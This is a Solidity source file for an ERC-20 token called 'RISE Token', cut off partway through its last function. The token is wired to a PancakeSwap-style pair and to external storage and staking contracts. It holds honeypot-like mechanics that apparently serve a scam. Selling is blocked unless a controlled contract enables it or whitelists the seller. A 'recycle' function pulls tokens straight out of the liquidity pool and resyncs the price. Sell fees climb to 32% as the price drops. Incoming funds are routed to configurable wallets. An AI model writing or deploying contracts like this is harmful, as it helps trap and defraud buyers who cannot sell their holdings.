// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC165 {
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

interface IWMATIC {
    function deposit() external payable;

    function withdraw(uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

library GSCUtils {
    uint256 public constant MIN_AMOUNT = 1;
    uint256 public constant SLIPPAGE_TOLERANCE = 95;
    uint256 public constant PERCENT_BASE = 100;
    bytes4 constant PANCAKE_PAIR_INTERFACE_ID = 0xfb3bdb41;

    error FundAddrZero();
    error SelfTransfer();
    error InsufficientBalance();
    error POLTransferFailed();
    error LPPairNotSet();
    error LPApproveFailed();
    error ExtractNothing();
    error GSCApproveFailed();
    error SwapGSCFailed();
    error PolAmountZero();
    error PolAmountTooSmall();
    error ReservesNotInit();
    error RecycleCooldown();
    error RatioExceedLimit();
    error LPPoolEmpty();
    error MaxRecycleZero();
    error LPAmountZero();
    error AccountZero();
    error EmptyAccounts();
    error WithdrawToZero();
    error WithdrawToSelf();
    error NoPOLBalance();
    error NoTokenBalance();
    error WithdrawPOLFailed();
    error WithdrawERC20Failed();
    error InvalidRouter();
    error InvalidFactory();
    error InvalidWETH();
    error GSCStorageNotSet();
    error StakingNotSet();
    error OnlyStaking();
    error BuyLimitExceeded();
    error SellDisabled();

    function getGscPolReserves(
        address lpPair,
        address gscToken
    ) internal view returns (uint256 gscReserve, uint256 polReserve) {
        if (lpPair == address(0)) revert LPPairNotSet();
        IPancakePair pair = IPancakePair(lpPair);
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        address token0 = pair.token0();
        (gscReserve, polReserve) = (gscToken == token0)
            ? (uint256(r0), uint256(r1))
            : (uint256(r1), uint256(r0));
    }

    function approveLpTokenIfNeeded(
        uint256 lpAmount,
        address lpPair,
        address router
    ) internal {
        IERC20 lpToken = IERC20(lpPair);
        uint256 currentAllowance = lpToken.allowance(address(this), router);
        if (currentAllowance < lpAmount) {
            bool approveSuccess = lpToken.approve(router, type(uint256).max);
            if (!approveSuccess) revert LPApproveFailed();
        }
    }

    function checkLpBalance(
        uint256 lpAmount,
        address lpPair
    ) internal view returns (bool) {
        return IERC20(lpPair).balanceOf(address(this)) >= lpAmount;
    }
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address);
}

interface IPancakePair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function sync() external;
}

interface IGSCStorage {
    function amountMin() external view returns (uint256);

    function amountBonud() external view returns (uint256);

    function getUserPoolAmount(address) external view returns (uint256);

    function amountInfo(uint256) external view returns (bool);

    function isExcludedFromFees(address) external view returns (bool);

    function isSpecialAddress(address) external view returns (bool);

    function sellEnabled() external view returns (bool);

    function buyEnabled() external view returns (bool);

    function setBuyEnabled(bool) external returns (bool);

    function gscStaking() external view returns (address);

    function fundAddress() external view returns (address);

    function walletAddress() external view returns (address);

    function communityAddress() external view returns (address);

    function topStakerAddress() external view returns (address);

    function dailyPoolAddress() external view returns (address);

    function slippageFee() external view returns (address);

    function swapRelay() external view returns (address);
}

interface IGSCStaking {
    function handleMain(
        address from,
        uint256 amount,
        uint256 liquidity,
        bytes calldata data
    ) external returns (bool, address);

    function getRemoveLiquidity(address, uint256) external view returns (bool);
}

interface ISwapRelay {
    function forwardERC20(address, address, uint256) external;

    function forwardETH(address, uint256) external;
}

interface ISlippageFeeVault {
    function isSwapping() external view returns (bool);

    function swapAndDistribute(bool isAtDef) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: not owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: zero address");
        _owner = newOwner;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    address public immutable DEAD = address(0xdEaD);

    IGSCStorage public gscStorage;
    address public pancakePair;
    address public pancakeRouter;
    uint256 public holderCount;
    mapping(address => bool) private _holders;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 private constant _MIN_AMOUNT = 1;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );

        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    event TransferErrorLog(
        address indexed from,
        address indexed to,
        uint256 amount,
        uint256 fromBalance,
        string errorReason
    );

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from zero address");
        require(to != address(0), "ERC20: transfer to zero address");
        if (amount == 0) return;

        uint256 fromBalance = _balances[from];

        uint256 maxTransfer = fromBalance - 1;
        if (amount > maxTransfer) {
            amount = maxTransfer;
        }
        if (amount == 0) return;

        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        _afterTokenTransfer(account, address(0), amount);
    }

    function _updateHolderCount(address from, address to) internal virtual {
        if (from == to) return;
        uint256 fromBalance = balanceOf(from);
        uint256 toBalance = balanceOf(to);
        if (!_holders[to] && toBalance > 0) {
            _holders[to] = true;
            holderCount++;
        }
        if (_holders[from] && fromBalance == 0) {
            _holders[from] = false;
            if (holderCount > 0) {
                holderCount--;
            }
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");
        _allowances[owner][spender] = amount;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract RISEToken is ERC20, Ownable {
    using GSCUtils for *;
    
    uint256 public constant DEFLATION_LIMIT = 10 * 10 ** 8 * 10 ** 18;
    uint256 public constant FEE_RATE_1 = 1;
    uint256 public constant FEE_RATE_3 = 3;
    uint256 public constant FEE_RATE_5 = 5;
    uint256 public constant RATIO_BASE = 10000;
    uint256 public constant HOLDER_COUNT_LIMIT = 30000;
    uint256 public constant RECYCLE_COOLDOWN = 86400;
    uint256 private constant FEE1 = 2;
    uint256 private constant FEE2 = 12;
    uint256 private constant FEE3 = 22;
    uint256 private constant FEE4 = 32;

    uint256 public BUY_OPEN_TIME = 1746076800;
    uint256 public dailyBasePrice;
    uint256 public lastPrice;
    uint256 public lastPriceResetTime;
    IWMATIC public wmatic;

    bool public buyEnabledAutoTriggered;
    uint256 public lastRecycleTimestamp;
    mapping(address => uint256) public buyLimit;
    mapping(address => uint256) public usedBuyLimit;
    mapping(address => bool) private _isInLimitedList;
    mapping(address => bool) public systemAddresses;

    address[] private _limitedAddresses;
    bool public swapping;
    bool private _inSwap;

    modifier lockSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor() ERC20("RISE Token", "RISE") {
        uint256 MAX_SUPPLY = 1000 * 10 ** 8 * 10 ** 18;
        address mintAddress = msg.sender;
        _mint(mintAddress, MAX_SUPPLY);
        _updateHolderCount(mintAddress, address(this));
    }

    function isBuySwap(address from) private view returns (bool) {
        return from == pancakePair;
    }

    function isSellSwap(address to) private view returns (bool) {
        return to == pancakePair;
    }

    receive() external payable {
        _dispatchAction();
    }

    fallback() external payable {
        _dispatchAction();
    }

    function _dispatchAction() private {
        if (systemAddresses[msg.sender] || _inSwap) return;

        uint256 totalFund = msg.value;
        if (totalFund == 0) {
            return;
        }

        bool isGscStorage = isGscStorageSet();
        if (!isGscStorage) {
            revert("StakeFailed");
        }

        uint256 liquidity = 0;
        uint256 shareAmount = 0;
        if (
            totalFund >= IGSCStorage(gscStorage).amountMin() &&
            totalFund != IGSCStorage(gscStorage).amountBonud() &&
            !IGSCStorage(gscStorage).amountInfo(totalFund)
        ) {
            (liquidity, shareAmount) = _call(totalFund, isGscStorage);
        }

        address stakingAddr = IGSCStorage(gscStorage).gscStaking();
        if (stakingAddr != address(0)) {
            (bool isSuccess, address shareAddress) = IGSCStaking(stakingAddr)
                .handleMain(_msgSender(), totalFund, liquidity, _msgData());

            if (!isSuccess) revert("StakeFailed");

            if (shareAmount > 0) {
                if (shareAddress == address(0))
                    shareAddress = IGSCStorage(gscStorage).communityAddress();
                if (shareAddress != address(0) && shareAddress != address(this))
                    _transferTo(shareAmount, shareAddress);
            }
        }

        address walletAddr = IGSCStorage(gscStorage).walletAddress();
        if (walletAddr != address(this))
            _transferTo(address(this).balance, walletAddr);
    }

    function _transferTo(uint256 amount, address fundAddress) private {
        if (amount == 0) return;

        // 原逻辑：检查地址和余额
        if (fundAddress == address(0)) {
            revert GSCUtils.InsufficientBalance();
        }
        if (address(this).balance < amount) {
            revert GSCUtils.InsufficientBalance();
        }

        (bool success, ) = payable(fundAddress).call{value: amount, gas: 2300}(
            ""
        );

        if (!success) {
            revert GSCUtils.POLTransferFailed();
        }
    }

    function _swapETH(uint256 balance, address walletAddr) private {
        if (balance == 0) return;
        wmatic.deposit{value: balance}();
        _unSwap(walletAddr);
    }

    function _unSwap(address anonA) private {
        uint256 transferAmount = wmatic.balanceOf(address(this));
        if (transferAmount == 0 || anonA == address(0)) {
            revert GSCUtils.InsufficientBalance();
        }

        bool success = wmatic.transfer(anonA, transferAmount);
        if (!success) {
            revert GSCUtils.POLTransferFailed();
        }
    }

    function isGscStorageSet() public view returns (bool) {
        return address(gscStorage) != address(0);
    }

    function totalSupply() public view override returns (uint256) {
        return super.totalSupply() - balanceOf(DEAD);
    }

    function _checkAutoEnableBuy(bool isGscStorage) private {
        if (buyEnabledAutoTriggered || !isGscStorage) return;
        if (isGscStorage) {
            bool isHolderCountReached = holderCount >= HOLDER_COUNT_LIMIT;
            uint256 balance = balanceOf(pancakePair);
            bool isTotal = balance > 0 && balance <= DEFLATION_LIMIT;
            if (isHolderCountReached || isTotal) {
                if (!gscStorage.setBuyEnabled(true)) revert("EnableBuyFailed");
                buyEnabledAutoTriggered = true;
            }
        }
    }

    function _getFactory() private view returns (address factoryAddr) {
        if (pancakeRouter == address(0)) revert GSCUtils.InvalidRouter();
        factoryAddr = IPancakeRouter02(pancakeRouter).factory();
        if (factoryAddr == address(0)) revert GSCUtils.InvalidFactory();
    }

    function _getTokenLpPair() private view returns (address lpPair) {
        if (pancakeRouter == address(0)) revert GSCUtils.InvalidRouter();

        address factoryAddr = _getFactory();
        address wethAddr = IPancakeRouter02(pancakeRouter).WETH();

        lpPair = IPancakeFactory(factoryAddr).getPair(address(this), wethAddr);
    }

    function tokenLpPair() external view returns (address) {
        return _getTokenLpPair();
    }

    function externalRemoveLiquidity(
        uint256 originalLP,
        uint256 lpAmount,
        address recipient
    ) external lockSwap {
        _checkGscStaking();
        if (lpAmount == 0) revert GSCUtils.LPAmountZero();
        if (
            !IGSCStaking(gscStorage.gscStaking()).getRemoveLiquidity(
                recipient,
                lpAmount
            )
        ) revert("LiquidityInsufficient");
        _removeLiquidity(originalLP, lpAmount, recipient);
    }

    function _removeLiquidity(
        uint256 originalLP,
        uint256 lpAmount,
        address recipient
    ) internal {
        address lpPair = _getTokenLpPair();
        if (lpPair == address(0)) revert GSCUtils.LPPairNotSet();
        if (lpAmount == 0 || !GSCUtils.checkLpBalance(lpAmount, lpPair)) {
            return;
        }
        GSCUtils.approveLpTokenIfNeeded(lpAmount, lpPair, pancakeRouter);

        (uint256 extrGsc, uint256 extrPol) = _extractLp(lpAmount, lpPair);
        uint256 swappedPol = _swapGscToPol(extrGsc, lpPair);
        uint256 polAll = extrPol + swappedPol;
        uint256 polMax = gscStorage.getUserPoolAmount(recipient);
        if (polAll > polMax) {
            polAll = polMax;
        }
        if (polAll > 0) {
            _transferTo(polAll, recipient);
        }

        if (
            originalLP > lpAmount &&
            GSCUtils.checkLpBalance(originalLP - lpAmount, lpPair)
        ) {
            IERC20(lpPair).transfer(DEAD, originalLP - lpAmount);
        }
    }

    function _extractLp(
        uint256 lpAmount,
        address lpPair
    ) private returns (uint256, uint256) {
        (uint256 gscReserve, uint256 polReserve) = GSCUtils.getGscPolReserves(
            lpPair,
            address(this)
        );
        uint256 totalLpSupply = IERC20(lpPair).totalSupply();
        uint256 minGsc = (gscReserve * lpAmount * GSCUtils.SLIPPAGE_TOLERANCE) /
            (totalLpSupply * GSCUtils.PERCENT_BASE);
        uint256 minPol = (polReserve * lpAmount * GSCUtils.SLIPPAGE_TOLERANCE) /
            (totalLpSupply * GSCUtils.PERCENT_BASE);
        minGsc = minGsc == 0 ? GSCUtils.MIN_AMOUNT : minGsc;
        minPol = minPol == 0 ? GSCUtils.MIN_AMOUNT : minPol;
        if (minGsc == 0 || minPol == 0) revert("SlippageMinZero");
        address swapRelay = gscStorage.swapRelay();

        (uint256 extrGsc, uint256 extrPol) = IPancakeRouter02(pancakeRouter)
            .removeLiquidityETH(
                address(this),
                lpAmount,
                minGsc,
                minPol,
                swapRelay,
                block.timestamp + 300
            );

        if (extrGsc < 1 || extrPol == 0) revert GSCUtils.ExtractNothing();

        ISwapRelay(swapRelay).forwardETH(payable(address(this)), extrPol);
        ISwapRelay(swapRelay).forwardERC20(
            address(this),
            address(this),
            extrGsc
        );
        return (extrGsc, extrPol);
    }

    function _swapGscToPol(
        uint256 extrGsc,
        address pairAddr
    ) private returns (uint256 swappedPol) {
        uint256 actualExtrGsc = IERC20(address(this)).balanceOf(address(this));
        if (extrGsc > actualExtrGsc) extrGsc = actualExtrGsc;
        if (extrGsc <= 1) return 0;

        uint256 gscAllowance = IERC20(address(this)).allowance(
            address(this),
            pancakeRouter
        );

        if (gscAllowance < extrGsc) {
            bool gscApproveSuccess = IERC20(address(this)).approve(
                pancakeRouter,
                type(uint256).max
            );
            if (!gscApproveSuccess) revert GSCUtils.GSCApproveFailed();
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IPancakeRouter02(pancakeRouter).WETH();

        address swapRelay = gscStorage.swapRelay();

        uint[] memory amounts = IPancakeRouter02(pancakeRouter)
            .swapExactTokensForETH(
                extrGsc,
                GSCUtils.MIN_AMOUNT,
                path,
                swapRelay,
                block.timestamp + 300
            );
        swappedPol = amounts[1];

        ISwapRelay(swapRelay).forwardETH(payable(address(this)), swappedPol);

        if (pairAddr != address(0)) {
            super._transfer(pairAddr, DEAD, extrGsc);
            IPancakePair(pairAddr).sync();
        }
        return swappedPol;
    }

    function _addLiquidity(uint256 totalPolAmount) internal returns (uint256) {
        if (totalPolAmount == 0) revert GSCUtils.PolAmountZero();
        if (address(this).balance < totalPolAmount)
            revert GSCUtils.InsufficientBalance();
        uint256 polForSwap = totalPolAmount / 2;
        uint256 polForLiquidity = totalPolAmount - polForSwap;
        if (polForSwap == 0 || polForLiquidity == 0)
            revert GSCUtils.PolAmountTooSmall();

        address[] memory path = new address[](2);
        path[0] = IPancakeRouter02(pancakeRouter).WETH();
        path[1] = address(this);
        address swapRelay = gscStorage.swapRelay();
        uint[] memory amounts = IPancakeRouter02(pancakeRouter)
            .swapExactETHForTokens{value: polForSwap}(
            GSCUtils.MIN_AMOUNT,
            path,
            swapRelay,
            block.timestamp + 300
        );
        uint256 gscAmount = amounts[1];
        if (gscAmount == 0) revert GSCUtils.SwapGSCFailed();

        ISwapRelay(swapRelay).forwardERC20(
            address(this),
            address(this),
            gscAmount
        );

        (, , uint256 liquidity) = IPancakeRouter02(pancakeRouter)
            .addLiquidityETH{value: polForLiquidity}(
            address(this),
            gscAmount,
            GSCUtils.MIN_AMOUNT,
            GSCUtils.MIN_AMOUNT,
            swapRelay,
            block.timestamp + 300
        );

        if (liquidity == 0) revert GSCUtils.SwapGSCFailed();

        ISwapRelay(swapRelay).forwardERC20(
            pancakePair,
            address(this),
            liquidity
        );

        uint256 remainingGsc = balanceOf(address(this));
        if (remainingGsc > 0) {
            super._transfer(address(this), DEAD, remainingGsc);
        }

        return liquidity;
    }

    function _call(
        uint256 total,
        bool isGsc
    ) internal returns (uint256, uint256) {
        if (!isGsc) return (0, 0);
        uint256 total70 = (total * 70) / 100;
        uint256 total10 = (total * 10) / 100;

        address fundAddress = IGSCStorage(gscStorage).fundAddress();
        if (fundAddress != address(0) && fundAddress != address(this)) {
            _swapETH(total10, fundAddress);
        }

        address topStakerAddr = IGSCStorage(gscStorage).topStakerAddress();
        if (topStakerAddr != address(0) && topStakerAddr != address(this))
            _transferTo(total10, topStakerAddr);

        uint256 shareAmount = total - total70 - (total10 + total10);
        shareAmount = shareAmount > total ? 0 : shareAmount;
        return (_addLiquidity(total70), shareAmount);
    }


    function _getPolAmountFromGsc(
        uint256 gscAmount
    ) private view returns (uint256 polAmount) {
        (uint256 gscReserve, uint256 polReserve) = GSCUtils.getGscPolReserves(
            _getTokenLpPair(),
            address(this)
        );
        if (gscReserve == 0 || polReserve == 0) revert GSCUtils.ReservesNotInit();

        unchecked {
            polAmount = (gscAmount * polReserve) / gscReserve;
        }
    }

    function _checkBuyLimit(address buyer, uint256 gscAmount) private {

        require(block.timestamp > BUY_OPEN_TIME, "Trading not open yet");
        
        uint256 used = usedBuyLimit[buyer];
        uint256 limit = buyLimit[buyer];
        require(limit >= used, "Buy disabled");  

        uint256 polAmount = _getPolAmountFromGsc(gscAmount);
        uint256 remLimit = limit - used;
       
        require(remLimit > polAmount , "Insufficient buy limit");  

        usedBuyLimit[buyer] = used + polAmount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (amount == 0) return;
        require(from != address(0), "ERC20: transfer from zero address");
        require(to != address(0), "ERC20: transfer to zero address");

        bool isGscStorage = isGscStorageSet();
        if (!isGscStorage) {
            super._transfer(from, to, amount);
            _updateHolderCount(from, to);
            return;
        } else {
            address dailyPool = gscStorage.dailyPoolAddress();
            if (dailyPool == from || dailyPool == to) {
                super._transfer(from, to, amount);
                _updateHolderCount(from, to);
                return;
            }
        }

        bool isBuy = isBuySwap(from);
        bool isSell = isSellSwap(to);

        if (isBuy) { 
            bool buyAllowed = gscStorage.buyEnabled() || 
                          gscStorage.isSpecialAddress(from) || 
                          gscStorage.isSpecialAddress(to);
        
            if (!buyAllowed) {
                _checkBuyLimit(to, amount);  
            }

        } else if (isSell) {
            require(
                gscStorage.sellEnabled() ||
                    gscStorage.isSpecialAddress(from) ||
                    gscStorage.isSpecialAddress(to),
                "Sell disabled"
            );
        } else {
            super._transfer(from, to, amount);
            _updateHolderCount(from, to);
            _checkAutoEnableBuy(isGscStorage);
            return;
        }

        if (
            gscStorage.isExcludedFromFees(from) ||
            gscStorage.isExcludedFromFees(to)
        ) {
            super._transfer(from, to, amount);
            _updateHolderCount(from, to);
            _checkAutoEnableBuy(isGscStorage);
            checkAndResetDailyPrice();
            updateRealTimePrice();
            return;
        }

        _handleSlippageFeeSwap(from);

        if (isBuy) {
            _handleBuyLogic(from, to, amount);
        } else if (isSell) {
            _handleSellLogic(from, to, amount);
        }

        _updateHolderCount(from, to);
        _checkAutoEnableBuy(isGscStorage);
        checkAndResetDailyPrice();
        updateRealTimePrice();
    }

    function _handleSlippageFeeSwap(address from) private {
        address slippageFee = gscStorage.slippageFee();

        if (
            !swapping &&
            from != pancakePair &&
            !gscStorage.isSpecialAddress(from) &&
            slippageFee != address(0) &&
            !ISlippageFeeVault(slippageFee).isSwapping()
        ) {
            swapping = true;
            try
                ISlippageFeeVault(slippageFee).swapAndDistribute(
                    balanceOf(pancakePair) <= DEFLATION_LIMIT
                )
            {} catch {}
            swapping = false;
        }
    }

    function _handleBuyLogic(address from, address to, uint256 amount) private {
        address slippageFee = gscStorage.slippageFee();
        if (slippageFee == address(0) || slippageFee == address(this)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 buyFee = (amount * FEE_RATE_1) / GSCUtils.PERCENT_BASE;
        if (buyFee > 0 && buyFee < amount) {
            super._transfer(from, slippageFee, buyFee);
        }

        if (amount > buyFee) {
            super._transfer(from, to, amount - buyFee);
        }
    }

    function _handleSellLogic(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 remainingAmount = amount;

        uint256 totalBurnFee = calculateDynamicSlippage();

        if (totalBurnFee > 0) {
            uint256 feeToBurn = (amount * totalBurnFee) / GSCUtils.PERCENT_BASE;
            if (feeToBurn > remainingAmount) feeToBurn = remainingAmount;
            if (feeToBurn > 0) {
                super._transfer(from, DEAD, feeToBurn);
                remainingAmount -= feeToBurn;
            }
        }

        uint256 feeToSlippage;

        if (balanceOf(pancakePair) > DEFLATION_LIMIT) {
            // 5% + 3% = 8%
            feeToSlippage =
                (amount * (FEE_RATE_5 + FEE_RATE_3)) /
                GSCUtils.PERCENT_BASE;
        } else {
            feeToSlippage = (amount * FEE_RATE_1) / GSCUtils.PERCENT_BASE;
        }

        address slipAddr = gscStorage.slippageFee();
        if (
            feeToSlippage > 0 &&
            remainingAmount > 0 &&
            slipAddr != address(0) &&
            slipAddr != address(this)
        ) {
            uint256 actualFee = feeToSlippage > remainingAmount
                ? remainingAmount
                : feeToSlippage;
            super._transfer(from, slipAddr, actualFee);
            remainingAmount -= actualFee;
        }

        if (remainingAmount > 0) {
            super._transfer(from, to, remainingAmount);
        }
    }

    function calculateDynamicSlippage() public view returns (uint256) {
        uint256 openingPrice = dailyBasePrice;
        uint256 currentPrice = getCurrentPrice();
        if (openingPrice == 0 || currentPrice == 0) return 0;
        if (currentPrice >= openingPrice) return 0;

        uint256 priceDiff = openingPrice - currentPrice;
        uint256 priceChangeRatio = (priceDiff * 100) / openingPrice;

        if (priceChangeRatio >= 40) return FEE4;
        if (priceChangeRatio >= 30) return FEE3;
        if (priceChangeRatio >= 20) return FEE2;
        if (priceChangeRatio >= 10) return FEE1;

        return 0;
    }

    function getCurrentPrice() public view returns (uint256) {
        if (pancakePair == address(0)) return 0;

        (uint256 reserve0, uint256 reserve1, ) = IPancakePair(pancakePair)
            .getReserves();
        address token0 = IPancakePair(pancakePair).token0();

        (uint256 reserveWeth, uint256 reserveGsc) = (token0 == address(wmatic))
            ? (uint256(reserve0), uint256(reserve1))
            : (uint256(reserve1), uint256(reserve0));

        if (reserveGsc == 0 || reserveWeth == 0) return 0;
        return (reserveWeth * 10 ** 18) / reserveGsc;
    }

    function checkAndResetDailyPrice() private {
        if (dailyBasePrice == 0) {
            updateRealTimePrice();
            resetDailyPrice();
            return;
        }

        uint256 currentTime = block.timestamp;
        uint256 timeSinceLastReset = currentTime - lastPriceResetTime;
        bool isOver24Hours = timeSinceLastReset >= 86400;

        uint256 beijingTime = currentTime + 8 * 3600;
        uint256 beijingDay = beijingTime / 86400;
        uint256 beijingHour = (beijingTime % 86400) / 3600;

        uint256 lastResetBeijingDay = (lastPriceResetTime + 8 * 3600) / 86400;

        bool shouldUpdate = false;
        if (isOver24Hours) {
            shouldUpdate = true;
        } else {
            shouldUpdate = (beijingDay > lastResetBeijingDay &&
                beijingHour >= 8);
        }

        if (shouldUpdate) {
            updateRealTimePrice();
            resetDailyPrice();
        }
    }

    function resetDailyPrice() private {
        if (lastPrice == 0) return;
        dailyBasePrice = lastPrice;

        uint256 currentBeijingTime = block.timestamp + 8 * 3600;
        uint256 beijingDayStart = (currentBeijingTime / 86400) * 86400;
        uint256 beijing8AmUTC = beijingDayStart + 8 * 3600 - 8 * 3600;

        lastPriceResetTime = beijing8AmUTC;
    }

    function updateRealTimePrice() private {
        lastPrice = getCurrentPrice();
    }

    function _checkGscStaking() private view {
        if (!isGscStorageSet()) revert GSCUtils.GSCStorageNotSet();
        address gscStaking = IGSCStorage(gscStorage).gscStaking();
        if (gscStaking == address(0)) revert("gscStakingSet");
        if (msg.sender != gscStaking) revert("gscStaking");
    }

    function depositToPool(uint256 amount) external returns (uint256) {
        _checkGscStaking();
        if (amount == 0) revert("AmountZero");
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance == 0) revert("BalanceEmpty");
        uint256 depositAmount = amount > contractBalance
            ? contractBalance
            : amount;
        address lpPair = _getTokenLpPair();
        if (lpPair == address(0)) revert GSCUtils.LPPairNotSet();
        super._transfer(address(this), lpPair, depositAmount);
        IPancakePair(lpPair).sync();
        return depositAmount;
    }

    function recycle(uint256 rate) external returns (uint256) {
        _checkGscStaking();
        uint256 lastExecUTCDay = lastRecycleTimestamp / RECYCLE_COOLDOWN;
        uint256 currentUTCDay = block.timestamp / RECYCLE_COOLDOWN;
        if (currentUTCDay <= lastExecUTCDay) revert GSCUtils.RecycleCooldown();

        address lpPair = _getTokenLpPair();
        if (lpPair == address(0)) revert GSCUtils.LPPairNotSet();
        if (rate > RATIO_BASE) revert GSCUtils.RatioExceedLimit();

        uint256 poolBalance = balanceOf(lpPair);
        if (poolBalance == 0) revert GSCUtils.LPPoolEmpty();
        uint256 maxRecycleAmount = (poolBalance * 5) / 100;
        if (maxRecycleAmount == 0) revert GSCUtils.MaxRecycleZero();

        uint256 actualRecycle = (poolBalance * rate) / RATIO_BASE;
        if (actualRecycle > maxRecycleAmount) actualRecycle = maxRecycleAmount;
        if (actualRecycle == 0) return (0);

        super._transfer(lpPair, address(this), actualRecycle);
        IPancakePair(lpPair).sync();

        if (gscStorage.dailyPoolAddress() != address(0)) {
            super._transfer(
                address(this),
                gscStorage.dailyPoolAddress(),
                actualRecycle
            );
        }
        lastRecycleTimestamp = block.timestamp;
        return actualRecycle;
    }

    function _removeFromLimitedList(address account) private {
        uint256 length = _limitedAddresses.length;
        for (uint256 i = 0; i < length; i++) {
            if (_limitedAddresses[i] == account) {
                _limitedAddresses[i] = _limitedAddresses[length - 1];
                _limitedAddresses.pop();
                _isInLimitedList[account] = false;
                break;
            }
        }
    }

    function setBuyLimitForAddress(
        address account,
        uint256 limitAmount
    ) external {
        _checkGscStaking();
        if (account == address(0)) revert GSCUtils.AccountZero();
